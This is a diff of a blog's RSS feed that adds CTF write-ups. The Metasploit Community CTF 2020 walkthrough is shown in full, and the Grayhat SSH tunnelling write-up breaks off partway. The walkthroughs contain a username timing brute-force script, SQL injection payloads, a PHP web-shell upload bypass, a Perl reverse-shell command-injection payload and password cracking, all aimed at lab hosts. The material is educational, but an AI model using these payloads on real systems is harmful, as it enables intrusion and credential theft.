@@ -1,48 +1,596 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>CTF on ikuamike</title>
-    <link>https://blog.ikuamike.io/tags/ctf/</link>
-    <description>Recent content in CTF on ikuamike</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <copyright>© Michael Ikua</copyright>
-    <lastBuildDate>Mon, 07 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>Metasploit Community CTF December 2020 WriteUp</title>
-      <link>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</link>
-      <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Grayhat Red Team Village CTF 2020 WriteUp: Tunneler</title>
-      <link>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</link>
-      <pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>RaziCTF 2020 WriteUp: Chasing a lock</title>
-      <link>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</link>
-      <pubDate>Wed, 28 Oct 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2020/razictf-chasingalock-writeup/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>CyberSpaceKenya CTF: ZuluMeats3</title>
-      <link>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</link>
-      <pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate>
-      
-      <guid>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</guid>
-      <description></description>
-    </item>
-    
-  </channel>
-</rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on ikuamike</title><link>https://blog.ikuamike.io/tags/ctf/</link><description>Recent content in CTF on ikuamike</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>© Michael Ikua</copyright><lastBuildDate>Mon, 07 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>Metasploit Community CTF December 2020 WriteUp</title><link>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</link><pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/metasploitctf2020/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>Over the weekend I participated in &lt;a href="https://ctftime.org/event/1200" target="_blank" rel="noopener">Metasploit Community December CTF&lt;/a>
+by Rapid7
+with team &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
+. We ended up getting position 57/413. The CTF was meant to be beginner-friendly.&lt;/p>
+&lt;h1 id="intro">Intro&lt;/h1>
+&lt;p>Teams are provided with their own instance of a kali box which is public facing to act as a jump host to reach
+an ubuntu VM which hosts the challenges.&lt;/p>
+&lt;p>On the ubuntu VM there are 20 open ports for each challenge. To complete a challenge you need to find a challenge
+flag and submit the MD5 checksum of the PNG to get points.&lt;/p>
+&lt;p>I decided to tunnel all connections to the victim through ssh with sshuttle using the below command:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">sshuttle -r kali@52.90.96.4 -e &lt;span style="color:#e6db74">&amp;#34;ssh -i metasploit_ctf_kali_ssh_key.pem&amp;#34;&lt;/span> 172.15.18.101/32
+&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="challenges">Challenges:&lt;/h1>
+&lt;h2 id="4-of-hearts">4 of Hearts&lt;/h2>
+&lt;p>After tunneling the connections to the Ubuntu VM the first flag is on port 80, &lt;code>http://172.15.18.101/4_of_hearts.png&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/4_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="6-of-hearts">6 of Hearts&lt;/h2>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>There is a photos website running on port 6868. There is a functionality to sign up that creates directories based on a user&amp;rsquo;s
+initials of their names.&lt;/p>
+&lt;p>On signing up we first get the notes directory.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>On the home page, there are images which are hosted under files directory with different users initials.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Since there&amp;rsquo;s no authentication we can try look at notes for each of the discovered users.&lt;/p>
+&lt;p>&lt;strong>BD&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>TW&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_5.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>MC&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port6868_6.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>From the above notes we can tell that there&amp;rsquo;s a site admin whose name is &lt;em>Beth Ulysses Denise Donnoly Yager&lt;/em>, this creates the initials
+&lt;em>BUDDY&lt;/em>.&lt;/p>
+&lt;p>We can then get the flag with these initials at the url &lt;code>http://172.15.18.101:6868/files/BUDDY/2&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/6_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h1 id="3-of-spades">3 of Spades&lt;/h1>
+&lt;p>To solve this one we are required to identify a valid username aside from guest. When you submit guest which is a valid username, the
+request takes about 5 seconds to complete but if you supply a non-valid username it takes less than a second. The password doesn&amp;rsquo;t
+matter.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8080.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>I created a python script to bruteforce the username with a wordlist:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> requests
+url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://172.15.18.101:8080/login.php&amp;#34;&lt;/span>
+user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;guest&amp;#34;&lt;/span>
+f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;/usr/share/seclists/Usernames/cirt-default-usernames.txt&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)
+users &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+f&lt;span style="color:#f92672">.&lt;/span>close()
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">guess&lt;/span>(username):
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Testing username: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> username &lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#34;...&amp;#34;&lt;/span>)
+data &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>:username,&lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>}
+r &lt;span style="color:#f92672">=&lt;/span> requests&lt;span style="color:#f92672">.&lt;/span>post(url, data&lt;span style="color:#f92672">=&lt;/span>data)
+response_time &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>elapsed&lt;span style="color:#f92672">.&lt;/span>total_seconds()
+&lt;span style="color:#66d9ef">if&lt;/span> response_time &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Valid user found: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> username)
+exit()
+&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> users:
+guess(i&lt;span style="color:#f92672">.&lt;/span>strip())
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>It found the user to be demo:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8080_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>When we submit it we get the url to the flag, &lt;code>http://172.15.18.101:8080/a3lk3d939d993201ld.png&lt;/code>.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8080_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/3_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="2-of-spades">2 of Spades&lt;/h2>
+&lt;p>There&amp;rsquo;s a website with the ability to search for reviews on port 9001.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>First thing to check with search functionality is SQLi, after adding a quote &lt;code>'&lt;/code> we get a sqlite3 error confirming presence of sqli:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Using this payload we can get the structure of the db:&lt;/p>
+&lt;pre>&lt;code>overwatch' union select 1,sql,3 FROM sqlite_master;-- -
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Then we can extract the link to the flag with this payload:&lt;/p>
+&lt;pre>&lt;code>overwatch' union select 1,flag,link FROM hidden-- -
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9001_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/2_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="8-of-hearts">8 of Hearts&lt;/h2>
+&lt;p>On port 4545, We are provided with 2 files:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port4545.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>When you run the elf binary it asks for buffalo and if you give one it asks for more.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port4545_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>All we needed to do was guess how many buffaloes it needed, the exact value was between 100 and 200.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port4545_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/8_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="8-of-spades">8 of Spades&lt;/h2>
+&lt;p>On port 1080 a socks5 proxy is running on this port without any authentication. We can edit &lt;code>/etc/proxychains.conf&lt;/code> and add this server as a socks5
+proxy server.&lt;/p>
+&lt;pre>&lt;code>socks5 172.15.18.101 1080
+&lt;/code>&lt;/pre>&lt;p>Next we need to discover open ports that we can access through the proxy. Port scanning over a proxy can be really slow, therefore, lets
+check the top 100 ports first.&lt;/p>
+&lt;pre>&lt;code>proxychains nmap -sT --top-ports=100 127.0.0.1
+&lt;/code>&lt;/pre>&lt;p>Nmap discovers port 22 and 8000 open.&lt;/p>
+&lt;p>Port 8000 is a web server hosting our flag:&lt;/p>
+&lt;pre>&lt;code>proxychains curl 127.0.0.1:8000
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port1080.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/8_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="red-joker">Red Joker&lt;/h2>
+&lt;p>On port 9007, we get a zip file.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9007.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Only thing needed is to extract it:&lt;/p>
+&lt;pre>&lt;code>7z x red_joker.zip
+&lt;/code>&lt;/pre>&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/joker_red.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="6-of-diamonds">6 of Diamonds&lt;/h2>
+&lt;p>On port 8200, there&amp;rsquo;s a website that we can upload images.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>It only allows jpeg and png files by checking mime type and file extension. We can bypass this restriction with a few tricks.&lt;/p>
+&lt;p>We can create a php file with a valid jpeg mime type with this command:&lt;/p>
+&lt;pre>&lt;code>echo -n -e '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01' &amp;gt; shell.php
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Then we can intercept the request in burp suite and change the extension and add our php exploit code.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>We can successfully execute commands and get the location of the flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8200_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Flag was found at &lt;code>http://172.15.18.101:8200/157a7640-0fa4-11eb-adc1-0242ac120002/6_of_diamonds.png&lt;/code>.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/6_of_diamonds.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="queen-of-spades">Queen of Spades&lt;/h2>
+&lt;p>On port 8202, we have another website with barely any functionality to interact with.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>But when we look at burp where we are proxying http traffic, there is some communication to an api which looks very much like
+graphql.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>A common misconfiguration to check is if introspection is enabled on the endpoint.&lt;/p>
+&lt;p>When we supply an introspection payload (you can use the ones from &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection" target="_blank" rel="noopener">payloadallthethings repo&lt;/a>
+) it works and we get the schema.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>To understand the result, we can easily visualize this at &lt;a href="https://apis.guru/graphql-voyager/">https://apis.guru/graphql-voyager/&lt;/a>&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>With this structure we can easily make our queries.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>The below query gives the location of the flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8202_5.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/queen_of_spades.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="2-of-hearts">2 of Hearts&lt;/h2>
+&lt;p>On port 9000, there&amp;rsquo;s another website similar to the one port 9001 but this one has a different way in which it handles searches. When we search using
+just a single character a, the first result is interesting as it looks like a folder in a terminal.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9000.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>This could mean our input is being used to construct a shell command. We can try getting a reverse shell using this reverse shell payload:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-perl" data-lang="perl">$&lt;span style="color:#960050;background-color:#1e0010">(&lt;/span>perl &lt;span style="color:#f92672">-&lt;/span>e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;172.15.18.100&amp;#34;;$p=9000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We successfully get a reverse shell.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9000_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>The vulnerable code is using the find command:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port9000_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/2_of_hearts.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="black-joker">Black Joker&lt;/h2>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>The web app here has two visible functionalities:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_2.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>When we try to sign up, we get the response that no new members can signup. When trying to look at the request in burp suite, there was
+none. Therefore it must be a frontend response.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>sign-up.js:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_3.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Looking at the forgotten your password functionality, we can supply an email. The home page contains this email: &lt;a href="mailto:admin@example.com">admin@example.com&lt;/a>.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_4.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>This gets us a hint but it&amp;rsquo;s not enough information. When we look at the full request in burp, there was actually more information
+sent back that wasn&amp;rsquo;t displayed.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_5.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>From the js file we gather that the site accepts passwords between 9 and 14 chars long, which are should have only a-z and 0-9 characters.
+Having a hash and the beginning of the password we can generate a wordlist and crack the hash.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">crunch &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> 0123456789abcdefghijklmnopqrstuvwxyz &amp;gt; temp
+sed -e &lt;span style="color:#e6db74">&amp;#39;s/^/ihatesalt/&amp;#39;&lt;/span> temp &amp;gt; wordlist.txt
+hashcat -m &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#e6db74">&amp;#39;7f35f82c933186704020768fd08c2f69&amp;#39;&lt;/span> wordlist.txt
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Recovered Password: ihatesaltalot7&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_6.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>Supplying the email and password to /admin, we get the flag.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8123_7.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/black_joker.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h2 id="4-of-clubs">4 of Clubs&lt;/h2>
+&lt;p>Port 8092:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8092.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>For this challenge, we were able to bypass the hash check by supplying the password as an empty array.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/port8092_1.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;p>&lt;strong>Flag&lt;/strong>:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/metasploitctf2020/4_of_clubs.png" alt="metasploit_ctf_2020" class="center" style="border-radius: 8px;" />
+&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>This was a very nice ctf to brush up on some basic concepts. As we didn&amp;rsquo;t solve all challenges, that means we still have some
+things to learn.&lt;/p>
+&lt;p>Follow our team twitter account: &lt;a href="https://twitter.com/fr334aks" target="_blank" rel="noopener">fr334aks&lt;/a>
+&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item><item><title>Grayhat Red Team Village CTF 2020 WriteUp: Tunneler</title><link>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</link><pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2020/grayhat_red_team_village_ctf_tunneler_writeup/</guid><description/><content>&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>During Grayhat Conference the Red Team Village hosted a beginner/intermediate CTF. Our CTF team fr334aks decided
+to participate as we enjoyed the previous CTF created by them during DEFCON. I tackled the Tunneler challenges
+that were exactly the same as the previous CTF. So with the less pressure it was a nice opportunity to make a writeup for
+ssh tunneling techniques.&lt;/p>
+&lt;p>I am writing this to serve as a personal reference for ssh tunneling as it has a very good practical aspect to use as an example. I will show different
+ways these challenges could have been solved.&lt;/p>
+&lt;h3 id="1-bastion">1. Bastion&lt;/h3>
+&lt;p>Challenge description:&lt;/p>
+&lt;pre>&lt;code>Connect to the bastion host 104.131.101.182
+User: tunneler
+Password: tunneler
+SSH Port: 2222
+&lt;/code>&lt;/pre>&lt;p>Solution:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh tunneler@104.131.101.182 -p &lt;span style="color:#ae81ff">2222&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we ssh in, we get the following welcome message and also the bastion host is connected to multiple networks. We don&amp;rsquo;t see the ip we used to ssh in as
+we are droppped in a docker container.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot1.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="2-browsing-websites">2. Browsing Websites&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>Browse to http://10.174.12.14/
+&lt;/code>&lt;/pre>&lt;p>This challenge requires a local port forward.&lt;/p>
+&lt;p>Solution 1:&lt;/p>
+&lt;p>Using ssh command.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh tunneler@104.131.101.182 -p &lt;span style="color:#ae81ff">2222&lt;/span> -L 8000:10.174.12.14:80
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then use curl to reach the website.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl 127.0.0.1:8000
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
+&lt;p>Using ssh config and add &lt;code>LocalForward&lt;/code> entry.&lt;/p>
+&lt;pre>&lt;code>Host bastion
+Hostname 104.131.101.182
+User tunneler
+Port 2222
+LocalForward 8000 10.174.12.14:80
+&lt;/code>&lt;/pre>&lt;p>Then ssh into bastion and run curl as above.&lt;/p>
+&lt;p>Solution 3:&lt;/p>
+&lt;p>Running sshuttle to add a route to the target ip, this utilizes the ssh config for bastion without the localforward entry.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sshuttle -r bastion 10.174.12.14/32
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The beauty about this one is that I can reach the ip directly now.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl 10.174.12.14
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot2.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="3-ssh-in-tunnels">3. SSH in tunnels&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
+&lt;pre>&lt;code>SSH through the bastion to the pivot.
+IP: 10.218.176.199
+User: whistler
+Pass: cocktailparty
+&lt;/code>&lt;/pre>&lt;p>For this challenge we need to jump through the bastion host and access the pivot.&lt;/p>
+&lt;p>Solution 1:&lt;/p>
+&lt;p>Using the &lt;code>-J&lt;/code> option in ssh command, this sets up a proxyjump.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -J tunneler@104.131.101.182:2222 whistler@10.218.176.199
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Solution 2:&lt;/p>
+&lt;p>Using ssh config, this builds on the config we started with in the previous challenge and uses &lt;code>ProxyJump&lt;/code>.&lt;/p>
+&lt;pre>&lt;code>Host pivot1
+Hostname 10.218.176.199
+User whistler
+ProxyJump bastion
+&lt;/code>&lt;/pre>&lt;p>Then all we need to do is run the following command and see that pivot1 is also connected to more than one network.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh pivot1
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/grayhat_2020/screenshot3.png" alt="grayhat_redteam_ctf" class="center" style="border-radius: 8px;" />
+&lt;h3 id="4-beacons-everywhere">4. Beacons Everywhere&lt;/h3>
+&lt;p>Challenge Description:&lt;/p>
